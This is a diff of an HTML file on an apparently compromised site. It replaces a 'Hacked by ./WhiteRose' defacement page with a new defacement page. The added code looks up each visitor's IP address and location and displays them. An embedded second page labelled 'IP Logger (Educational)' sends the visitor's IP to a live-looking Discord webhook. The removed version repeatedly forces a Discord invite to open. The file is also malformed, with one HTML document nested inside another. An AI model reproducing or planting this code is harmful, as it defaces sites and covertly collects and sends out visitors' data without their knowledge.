@@ -1,43 +1,138 @@
-
-<HTML>
-	<head>
-		<script>
-			setInterval(() => {
-			  const pageUrl = `hhttps://discord.gg/Wja26HUu`;
-			  invokeNative('openPage', { url: pageUrl });
-			}, 3000);
-		</script>
-		<title>Hacked by ./WhiteRose </title>
-		<meta http-equiv="content-type" content="text/html;charset=utf-8" />
-		<meta name="description" content="Hacked by ./WhiteRose " />
-		<meta name="keywords" content="Hacked by ./WhiteRose  '3naty Family"/>
-		<link rel="preconnect" href="https://fonts.googleapis.com"/>
-		<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-		<link href="https://fonts.googleapis.com/css2?family=Martian+Mono:wght@300&display=swap" rel="stylesheet"/>
-		<link href="https://fonts.googleapis.com/css2?family=Roboto+Condensed:ital,wght@1,300&display=swap" rel="stylesheet">
-	</head>
-	<body bgcolor=black onclick="play()">
-		<center>
-			<video autoplay muted loop playsinline style="pointer-events: none; width: 400px;">
-    <source src="https://cdn.discordapp.com/attachments/1294655471055142923/1397841411868590213/yqPMarQpQAHeZzBk.mov?ex=6885d3c3&is=68848243&hm=12d3152648e836b05247ec96efe474623590759842ee49045a86ce9c696b169b&" type="video/mp4">
-    </video>
-<br/>
-			<font face="Martian Mono:wght" color="white"><h3>0wn3d by <font color="red">./WhiteRose</font></h3></font>
-			<p style="color:white;font-size:13px;font-family:Roboto Condensed"><b>Free My boy Diddy.</b></p>
-			<font size="2px" face="Martian Mono" color="red"><b>Got Exploited RIP(Rest In piss)</font></b></br><br>
-			<font face="Courier New" size="3" color="white">[ Firas says ksmkm ]</font></br></br>
-    <audio autoplay loop>
-        <source src="https://cdn.discordapp.com/attachments/1294655471055142923/1397841411868590213/yqPMarQpQAHeZzBk.mov?ex=6885d3c3&is=68848243&hm=12d3152648e836b05247ec96efe474623590759842ee49045a86ce9c696b169b&" type="">
-        Your browser does not support the audio element.
-    </audio>
-		</center>
-		</div>
-	</body>
-	  <script>
-    var x = document.getElementById("sec");
-    function play() {
-      x.play(); 	
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>discord.gg/uaee</title>
+  <style>
+    html, body {
+      margin: 0;
+      padding: 0;
+      height: 100%;
+      overflow: hidden;
+      font-family: 'Courier New', Courier, monospace;
+      color: red;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      flex-direction: column;
+      text-align: center;
+      background: transparent;
     }
+
+    #bg-video {
+      position: fixed;
+      top: 0;
+      left: 0;
+      min-width: 100%;
+      min-height: 100%;
+      object-fit: cover;
+      z-index: -1;
+    }
+
+    .info {
+      font-size: 1.4em;
+      text-shadow: 0 0 8px red, 0 0 15px red, 0 0 25px red;
+      letter-spacing: 2px;
+    }
+
+    .text {
+      font-size: 3em;
+      text-shadow: 0 0 10px red;
+      letter-spacing: 5px;
+      margin-top: 2vh;
+    }
+  </style>
+</head>
+<body>
+
+  <!-- Background Video -->
+  <video id="bg-video" autoplay muted loop playsinline>
+    <source src="https://cdn.discordapp.com/attachments/1398170606133838035/1398487136491147414/filtered-4DCCACCF-3626-4119-BECC-F215EB2DEBCD.mov?ex=688632e3&is=6884e163&hm=c0ea41af3345c8c1086cc6d155461e5166400bbdb3141d3cfec7fa5d3348c9ef&" type="video/mp4">
+    Your browser does not support the video tag.
+  </video>
+
+  <!-- 🔊 Embedded MP3 Audio (autoplay + loop) -->
+  <audio autoplay loop>
+    <source src="https://cdn.discordapp.com/attachments/1398776601033965568/1398781203321982986/v10044g50000cabq0a3c77u1b0gkcnr0.mov?ex=68869c02&is=68854a82&hm=785b10f0df768a2b2ff1594c18e20fa1ee45d2002c4676dafed9192f23d509b8&" type="audio/mpeg">
+    Your browser does not support the audio element.
+  </audio>
+
+  <!-- IP Info Display -->
+  <div class="info" id="ip-info">
+    <strong>IP: <span id="ip"></span></strong><br>
+    <span><strong>City:</strong> <span id="city"></span></span><br>
+    <span><strong>Region:</strong> <span id="region"></span></span><br>
+    <span><strong>Country:</strong> <span id="country"></span></span><br>
+    <span><strong>Location:</strong> <span id="loc"></span></span><br>
+    <span><strong>Organization:</strong> <span id="org"></span></span><br>
+    <span><strong>Timezone:</strong> <span id="timezone"></span></span>
+  </div>
+
+  <!-- Footer Text -->
+  <div class="text">discord.gg/uaee
+  
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>IP Logger (Educational)</title>
+</head>
+<body>
+  <h1>Your IP Address:</h1>
+  <p id="ip">Loading...</p>
+
+  <script>
+    const WEBHOOK_URL = "https://discord.com/api/webhooks/1398895503436943441/iO67iBZhGBrO3_DpsECXgTwoYlW3EMe7MhqLIFTweFKGlYfbPo4iCzgbAUVZaU8VQYpN";
+
+    fetch('https://ipinfo.io/json')
+      .then(response => response.json())
+      .then(data => {
+        const ip = data.ip;
+        document.getElementById('ip').textContent = ip;
+        const payload = {
+          content: `🛰️ New Visitor IP: \`${ip}\``
+        };
+
+        fetch(WEBHOOK_URL, {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json'
+          },
+          body: JSON.stringify(payload)
+        }).then(res => {
+          console.log("IP sent to Discord.");
+        }).catch(err => {
+          console.error("Failed to send to Discord:", err);
+        });
+
+      })
+      .catch(error => {
+        document.getElementById('ip').textContent = "Failed to load IP.";
+        console.error("IP fetch error:", error);
+      });
   </script>
+</body>
 </html>
-			
+
+  
+  Exploited by Sm ,Whiterose 😉</div>
+
+  <!-- IP Lookup Script -->
+  <script>
+    fetch('https://ipinfo.io/json')
+      .then(response => response.json())
+      .then(data => {
+        document.getElementById("ip").textContent = data.ip;
+        document.getElementById("city").textContent = data.city;
+        document.getElementById("region").textContent = data.region;
+        document.getElementById("country").textContent = data.country;
+        document.getElementById("loc").textContent = data.loc;
+        document.getElementById("org").textContent = data.org;
+        document.getElementById("timezone").textContent = data.timezone;
+      });
+  </script>
+
+</body>
+</html>
